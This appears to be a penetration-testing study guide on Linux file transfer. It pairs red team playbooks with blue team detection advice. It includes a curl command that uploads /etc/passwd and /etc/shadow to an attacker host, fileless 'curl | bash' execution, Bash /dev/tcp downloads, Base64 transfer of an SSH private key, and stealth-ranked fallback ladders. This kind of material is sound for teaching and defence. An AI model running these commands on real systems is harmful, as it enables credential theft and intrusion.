# Linux File Transfer Methods

**Technical Report, Red Team Playbooks, and Blue Team Playbooks**

---

## 1. Technical Report: File Transfer Techniques on Linux Systems

---

## 1.1 Why Linux File Transfer Knowledge Is Critical

Linux systems are ubiquitous across:

* Web servers
* Cloud workloads
* Containers
* Network appliances
* Security tooling

As a result, Linux file transfer mechanisms are a **high-value target surface** for attackers and a **key monitoring challenge** for defenders.

Unlike Windows, Linux environments often:

* Expose many small utilities instead of a single framework
* Favor command-line tooling
* Rely heavily on HTTP/HTTPS for automation and updates

This flexibility makes Linux powerful—and easy to abuse.

---

## 1.2 Real-World Incident Response Case Study

The provided incident response scenario demonstrates **defense-aware malware behavior**:

* Initial access via **SQL Injection**
* Execution of a Bash dropper script
* Script attempts **three sequential download methods**:

  1. `curl`
  2. `wget`
  3. `python`

All methods used **HTTP**, reflecting a real-world trend:

> **Most modern malware uses HTTP/HTTPS for command-and-control and payload staging**, regardless of OS.

This redundancy ensures resilience against:

* Missing tools
* Partial hardening
* Minimal installations

---

## 1.3 Common Linux File Transfer Channels

Linux systems can transfer files via:

* HTTP / HTTPS
* SSH (SCP, SFTP)
* FTP
* SMB (less common, but present)
* Raw TCP via Bash
* Offline encoding (Base64)

Attackers almost always **start with HTTP**, then pivot if necessary.

---

## 1.4 Base64 Encoding and Decoding (Offline Transfers)

### Purpose

Base64 enables **file transfer without network communication**, useful when:

* Network egress is blocked
* Traffic is heavily monitored
* Only a terminal or web shell is available

---

### Workflow Overview

1. Hash original file (integrity baseline)
2. Encode file using `base64`
3. Copy encoded string
4. Paste and decode on target
5. Re-hash and compare

---

### Encoding Example (Attacker / Pwnbox)

```bash
md5sum id_rsa
cat id_rsa | base64 -w 0; echo
```

* `-w 0` ensures a single-line output
* `echo` adds a newline for usability

---

### Decoding Example (Target)

```bash
echo -n '<base64-data>' | base64 -d > id_rsa
md5sum id_rsa
```

Matching hashes confirm a successful transfer.

---

### Limitations

* Large files are impractical
* Copy/paste limits
* Shell truncation risk
* Human error

Despite this, Base64 remains **extremely reliable** in restricted environments.

---

## 1.5 Web Downloads with wget and cURL

### wget

```bash
wget https://example.com/file.sh -O /tmp/file.sh
```

### cURL

```bash
curl -o /tmp/file.sh https://example.com/file.sh
```

Both tools:

* Are widely installed
* Support proxies
* Blend into legitimate admin activity

This makes them **default choices for malware and red teams alike**.

---

## 1.6 Fileless Execution on Linux

Linux pipes enable **execution without saving files to disk**.

### Fileless Bash Execution

```bash
curl https://example.com/script.sh | bash
```

### Fileless Python Execution

```bash
wget -qO- https://example.com/script.py | python3
```

This reduces:

* Disk artifacts
* Forensic evidence
* Simple signature detection

⚠️ Note: Some payloads may still write temporary files (e.g., `mkfifo`).

---

## 1.7 Bash /dev/tcp File Transfers

If `curl` and `wget` are unavailable, Bash itself can communicate over TCP.

### Open TCP Connection

```bash
exec 3<>/dev/tcp/10.10.10.32/80
```

### Send HTTP Request

```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n" >&3
```

### Read Response

```bash
cat <&3
```

This method:

* Requires Bash ≥ 2.04
* Bypasses tool-based restrictions
* Is noisy and manual, but effective

---

## 1.8 SSH and SCP Downloads

SSH is commonly allowed for administration.

### Enabling SSH Server (Attacker)

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
```

### Verify Port 22

```bash
netstat -lnpt
```

### Download Using SCP

```bash
scp user@attacker-ip:/path/file .
```

Best practice:

* Use **temporary accounts**
* Avoid reusing personal SSH keys

---

## 1.9 Upload Operations (Linux → Attacker)

Uploads are required for:

* Credential theft
* Log exfiltration
* Packet capture analysis
* Source code extraction

Every download technique has a corresponding upload variant.

---

## 1.10 Web Uploads with uploadserver (HTTPS)

### Install uploadserver

```bash
python3 -m pip install --user uploadserver
```

### Create Self-Signed Certificate

```bash
openssl req -x509 -out server.pem -keyout server.pem \
-newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

### Start HTTPS Upload Server

```bash
python3 -m uploadserver 443 --server-certificate ~/server.pem
```

---

### Upload Files from Target

```bash
curl -X POST https://attacker-ip/upload \
-F 'files=@/etc/passwd' \
-F 'files=@/etc/shadow' --insecure
```

* `--insecure` bypasses self-signed cert validation
* HTTPS blends into normal traffic

---

## 1.11 Ad-Hoc Web Servers for Exfiltration

If inbound connections are allowed, attackers can **host files on the target**.

### Python 3

```bash
python3 -m http.server
```

### Python 2

```bash
python2.7 -m SimpleHTTPServer
```

### PHP

```bash
php -S 0.0.0.0:8000
```

### Ruby

```bash
ruby -run -ehttpd . -p8000
```

Attacker then downloads files using `wget` or `curl`.

---

## 1.12 SCP Uploads

If outbound SSH is allowed:

```bash
scp /etc/passwd user@target-ip:/home/user/
```

SCP syntax mirrors `cp`, reducing operator error.

---

## 1.13 Key Operational Takeaways

* Linux offers **many redundant transfer paths**
* HTTP/HTTPS dominates real-world malware
* Fileless execution is trivial via pipes
* Bash alone can perform network I/O
* SSH is a powerful bidirectional channel
* Uploads are just as important as downloads

---

# 2. Red Team Playbooks

---

## Red Team Playbook 1: Linux File Transfer Fallback Chain

**Objective:**
Guarantee payload delivery.

**Order of Operations:**

1. `curl`
2. `wget`
3. Python
4. Bash `/dev/tcp`
5. Base64 copy/paste

Never rely on a single method.

---

## Red Team Playbook 2: Fileless First Strategy

**Objective:**
Reduce forensic footprint.

**Techniques:**

* `curl | bash`
* `wget | python`
* In-memory execution

Write to disk only if persistence is required.

---

## Red Team Playbook 3: Secure Exfiltration

**Objective:**
Exfiltrate data quietly.

**Methods:**

* HTTPS uploads
* SCP over SSH
* Small, staged transfers

Slow and steady beats loud and fast.

---

# 3. Blue Team Playbooks

---

## Blue Team Playbook 1: Tool-Agnostic Detection

**Objective:**
Detect behavior, not binaries.

**Indicators:**

* Unexpected outbound HTTP from servers
* Pipes into `bash` or `python`
* Use of `/dev/tcp`
* Sudden web servers on non-standard ports

---

## Blue Team Playbook 2: Egress Filtering

**Objective:**
Break attacker redundancy.

**Controls:**

* Proxy enforcement
* Restrict outbound HTTP/S
* Block `/dev/tcp` where feasible
* Limit SSH egress

Attackers succeed when egress is permissive.

---

## Blue Team Playbook 3: Fileless Attack Visibility

**Objective:**
Detect in-memory execution.

**Actions:**

* Enable command-line logging
* Monitor process pipes
* Track parent/child execution chains

Fileless ≠ logless.

---

## Blue Team Playbook 4: Incident Response Readiness

**Objective:**
Contain multi-actor compromise.

**Practices:**

* Assume redundancy in attacker tooling
* Search for multiple download attempts
* Correlate HTTP, shell, and process logs

If you find one method, assume two more were tried.

---

## Summary

* Linux file transfer methods are numerous and flexible
* HTTP/HTTPS is the dominant transport
* Attackers design redundancy into scripts
* Fileless execution is trivial via pipes
* Defenders must focus on **behavior and egress**
* Mastery requires hands-on experimentation

---

# Linux File-Transfer Decision Matrix

## 1. High-Level Decision Flow (Mental Model)

1. **Is outbound HTTP/HTTPS allowed?**

   * Yes → `curl` / `wget` (file or fileless)
   * No → Check SSH, SMB, or raw TCP

2. **Is SSH outbound allowed?**

   * Yes → `scp` / `sftp`
   * No → Continue

3. **Are any scripting languages available?**

   * Python → HTTP client / socket
   * Bash ≥ 2.04 → `/dev/tcp`

4. **Is *all* network egress blocked?**

   * Yes → Base64 copy/paste (offline)

5. **Need uploads (exfiltration)?**

   * HTTPS POST
   * SCP
   * Temporary web server on target

---

## 2. Linux File-Transfer Decision Matrix (Download)

| Constraint / Condition       | Best Method                | Backup Method             | Why This Works                      | Detection Risk     |
| ---------------------------- | -------------------------- | ------------------------- | ----------------------------------- | ------------------ |
| HTTP/HTTPS allowed           | `curl -o file`             | `wget -O file`            | Most Linux hosts allow outbound web | Medium             |
| HTTP allowed, no disk writes | `curl URL \| bash`         | `wget -qO- URL \| python` | Fileless execution via pipes        | High               |
| `curl` missing               | `wget`                     | Python `urllib`           | Minimal installs still have one     | Medium             |
| `curl` + `wget` blocked      | Python HTTP client         | Bash `/dev/tcp`           | Scripted fallback like real malware | Medium-High        |
| No web tools installed       | `/dev/tcp`                 | Base64                    | Bash networking is often overlooked | High               |
| SSH outbound allowed         | `scp user@host:file`       | `sftp`                    | Encrypted + trusted protocol        | Low-Medium         |
| SMB allowed (rare)           | `mount.cifs` / `smbclient` | SCP                       | Legacy or misconfigured envs        | Medium             |
| All network blocked          | Base64 decode              | Split Base64 chunks       | No network required                 | Very High (manual) |

---

## 3. Linux File-Transfer Decision Matrix (Upload / Exfiltration)

| Constraint / Condition    | Best Method                | Backup Method     | Why This Works                 | Detection Risk |
| ------------------------- | -------------------------- | ----------------- | ------------------------------ | -------------- |
| HTTPS outbound allowed    | `curl -X POST`             | Python requests   | Blends with normal TLS traffic | Medium         |
| HTTP allowed              | `curl -F upload`           | WebDAV            | Simple, flexible               | Medium         |
| SSH allowed               | `scp localfile user@host:` | `rsync`           | Reliable, encrypted            | Low            |
| Inbound allowed to target | Python `http.server`       | PHP / Ruby server | Flip direction of transfer     | Medium         |
| No inbound, no SSH        | Base64 encode              | Chunked Base64    | Works in worst-case            | High           |
| Large data                | SCP / rsync                | HTTPS chunking    | Integrity + speed              | Medium         |

---

## 4. Tool Availability Matrix

| Tool            | Usually Installed | Typical Block    | Notes                    |
| --------------- | ----------------- | ---------------- | ------------------------ |
| `curl`          | Yes               | Proxy / firewall | #1 malware choice        |
| `wget`          | Yes               | Proxy / firewall | Common fallback          |
| Python          | Very often        | App allowlisting | Extremely flexible       |
| Bash `/dev/tcp` | Often             | Rarely monitored | High stealth             |
| SCP / SSH       | Sometimes         | Egress controls  | Gold standard if allowed |
| FTP             | Rare              | Firewalls        | Mostly legacy            |
| SMB             | Rare              | Firewalls        | Mostly Windows-centric   |
| Base64          | Always            | Human limits     | Last-ditch method        |

---

## 5. Fileless vs On-Disk Decision Table

| Requirement          | Use Fileless?   | Why                     |
| -------------------- | --------------- | ----------------------- |
| Enumeration          | Yes             | Reduces artifacts       |
| Privilege escalation | Usually No      | Tools often need disk   |
| Persistence          | No              | Requires files          |
| Quick recon          | Yes             | Fast, disposable        |
| EDR present          | Prefer fileless | Avoids static detection |

---

## 6. Red-Team “Fallback Ladder” (Recommended Order)

**Downloads**

1. `curl`
2. `wget`
3. `curl | bash`
4. `wget | python`
5. Python socket / HTTP
6. Bash `/dev/tcp`
7. SCP
8. Base64

**Uploads**

1. HTTPS POST
2. SCP
3. Target-hosted web server
4. Base64

If you *don’t* think in ladders, you get stuck.

---

## 7. Blue-Team Mapping (What This Matrix Tells Defenders)

| Defender Question                  | Answer                   |
| ---------------------------------- | ------------------------ |
| “We blocked wget—are we safe?”     | No                       |
| “Do attackers need special tools?” | No                       |
| “Is fileless invisible?”           | No                       |
| “What’s the real control?”         | Egress + behavior        |
| “What’s the blind spot?”           | `/dev/tcp`, pipes, HTTPS |

---

## 8. One-Sentence Rule (Write This in Your Notes)

> **If a Linux system can reach the network and execute Bash, file transfer is always possible.**
